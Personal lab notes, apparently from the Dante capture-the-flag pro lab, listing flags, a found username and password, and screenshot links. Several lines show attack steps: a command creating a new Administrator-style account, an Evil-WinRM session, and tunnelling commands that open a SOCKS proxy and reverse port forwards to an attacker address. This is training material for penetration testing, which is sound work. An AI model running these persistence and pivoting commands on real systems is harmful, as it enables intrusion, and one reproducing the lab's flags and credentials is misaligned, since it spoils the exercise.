# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
`FoundCREDs`

### Flag
- `DANTE{Im_too_hot_Im_K3rb3r045TinG!}`
- `DANTE{DC_or_Marvel?}`
## External
### Enumeration
![](https://i.imgur.com/umtLnFK.png)

![](https://i.imgur.com/2qIyMQr.png)
![](https://i.imgur.com/rXXRyNC.png)
![](https://i.imgur.com/qo6KBcm.png)
` jbercov : myspace7 `
### Gaining Access
![](https://i.imgur.com/1253eC4.png)
## Internal
### Enumeration
![](https://i.imgur.com/MSNj3ws.png)
![](https://i.imgur.com/QE3WfKB.png)
### Gaining Access
![](https://i.imgur.com/6BPBhPp.png)
![](https://i.imgur.com/BZj9NCV.png)
`net user Admin_129834765 SamsungOctober102030 /add`
[[Dante - NIX07]]
```shell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat Note.txt
You were supposed to find this subnet via enumerating the browser history files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.
```
### Maintaining Access
![](https://i.imgur.com/HipxaEl.png)
`client -v 10.10.14.8:1234 socks`
- I couldnt access the ip `101` directly so i used msf and tried to get the ports.
- ![Uploading file...c8ngs]()

- We got port 80 is open and from the Browser hsitory port 8000 is open
```
client 10.10.14.8:8008 R:22:127.0.0.1:22 R:8000:localhost:8000
```
# Random Notes